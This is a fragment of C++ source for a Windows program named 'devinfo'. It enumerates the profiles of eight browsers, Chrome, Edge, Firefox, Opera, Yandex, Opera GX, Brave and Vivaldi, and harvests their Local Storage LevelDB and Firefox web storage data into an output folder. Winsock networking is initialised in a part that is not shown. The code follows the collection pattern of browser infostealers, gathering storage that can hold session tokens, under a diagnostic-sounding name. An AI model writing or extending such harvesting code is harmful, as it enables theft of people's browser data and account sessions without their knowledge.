    // userDataDir = the "User Data" root for Chromium browsers.
    // isFirefox   = different profile structure.
    struct Browser {
        std::string name;
        fs::path    userDataDir;
        bool        isFirefox;
    };

    std::vector<Browser> browsers = {
        // ── The required five ─────────────────────────────────────────────
        {"Chrome",   localApp/"Google"/"Chrome"/"User Data",                       false},
        {"Edge",     localApp/"Microsoft"/"Edge"/"User Data",                       false},
        {"Firefox",  roaming/"Mozilla"/"Firefox"/"Profiles",                        true},
        {"Opera",    roaming/"Opera Software"/"Opera Stable",                        false},
        {"Yandex",   localApp/"Yandex"/"YandexBrowser"/"User Data",                 false},
        // ── Extras ───────────────────────────────────────────────────────
        {"OperaGX",  roaming/"Opera Software"/"Opera GX Stable",                    false},
        {"Brave",    localApp/"BraveSoftware"/"Brave-Browser"/"User Data",           false},
        {"Vivaldi",  localApp/"Vivaldi"/"User Data",                                 false},
    };

    for (auto& b : browsers) {
        bool found = fs::exists(b.userDataDir);
        L("  " + std::string(found ? "[X]" : "[ ]") + "  " + b.name);
    }
    L("");

    if (!checkStream(out, runDirStr)) { WSACleanup(); return 1; }

    // ════════════════════════════════════════════════════════════════════════
    //  [3] LOCAL STORAGE CONTENT
    // ════════════════════════════════════════════════════════════════════════
    S(); L("[3] BROWSER LOCAL STORAGE"); S('-',40); L("");

    for (auto& b : browsers) {
        if (!fs::exists(b.userDataDir)) continue;

        S('-',40);
        L("[ " + b.name + " ]");
        S('-',40);

        // ── Firefox — different structure (SQLite, not LevelDB) ───────────
        if (b.isFirefox) {
            try {
                bool anyProf = false;
                for (auto& prof : fs::directory_iterator(b.userDataDir)) {
                    if (!prof.is_directory()) continue;
                    anyProf = true;
                    L("  Profile: " + wToUtf8(prof.path().filename().wstring()));
                    fs::path sqlite = prof.path() / "webappsstore.sqlite";
                    if (fs::exists(sqlite)) {
                        uintmax_t sz = 0;
                        try { sz = sqlite.file_size(); } catch (...) {}
                        L("    webappsstore.sqlite  (" + std::to_string(sz) + " B)");
                    }
                    fs::path st = prof.path() / "storage" / "default";
                    if (fs::exists(st)) {
                        try {
                            for (auto& site : fs::directory_iterator(st))
                                L("    Site: " + wToUtf8(site.path().filename().wstring()));
                        } catch (...) {}
                    }
                }
                if (!anyProf) L("  (no profiles found)");
            } catch (...) { L("  (access error)"); }
            L("");
            continue;
        }

        // ── Chromium-based — enumerate all profiles ───────────────────────
        auto profiles = enumProfiles(b.userDataDir);
        if (profiles.empty()) {
            L("  (no profiles found — browser may never have been launched)");
            L(""); continue;
        }

        for (auto& prof : profiles) {
            std::string profName = wToUtf8(prof.filename().wstring());
            L("  -- Profile: " + profName + " --");

            fs::path ldbDir = prof / "Local Storage" / "leveldb";
            processLevelDB(ldbDir, b.name + "_" + profName, runDir, out);
            L("");
        }
    }

    if (!checkStream(out, runDirStr)) { WSACleanup(); return 1; }

    // ── Footer ───────────────────────────────────────────────────────────────
    S(); L("  DONE"); S();
    out.close();
    WSACleanup();

    MessageBoxA(NULL,
        ("All files saved to:\n" + runDirStr).c_str(),
        "devinfo - Done", MB_OK | MB_ICONINFORMATION);
    return 0;
}
